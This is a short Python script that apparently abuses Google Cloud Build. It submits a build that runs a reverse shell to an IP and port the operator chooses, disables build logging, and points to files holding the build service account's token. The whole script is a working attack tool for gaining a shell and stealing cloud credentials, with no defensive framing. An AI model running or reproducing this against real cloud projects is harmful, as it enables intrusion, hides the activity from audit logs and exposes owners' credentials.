#!/usr/bin/env python3

import google.oauth2.credentials
from googleapiclient import discovery
import json


def main():
    project_id = input('Enter an the project id: ')
    access_token = input('Enter an access token to use for authentication: ')
    credentials = google.oauth2.credentials.Credentials(access_token.rstrip())
    cb = discovery.build('cloudbuild', 'v1', credentials=credentials)

    ip = input('Enter ip to receive the reverse shell: ')
    port = input('Enter port to receive the reverse shell: ')

    command = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    
    build_body = {
        'steps': [
            {
                'name': 'python',
                'entrypoint': 'python',
                'args': [
                    '-c',
                    command
                ]
            }
        ],
        # If you don't indicate any, the default is <PROJECT_NUMBER>@cloudbuild.gserviceaccount.com
        #'serviceAccount': "projects/<project_id>/serviceAccounts/<sa@email.com>",
        "options": {
            "logging": "NONE"
        }
    }

    response = cb.projects().builds().create(projectId=project_id, body=build_body).execute()
    print(json.dumps(response, indent=4))


    print(f'Build submitted. Now wait for the reverse to show up to {ip}:{port}')
    print("You should be able to find the SA token in /root/tokencache/gsutil_token_cache, /builder/home/.netrc or /builder/home/.docker/config.json")


if __name__ == '__main__':
    main()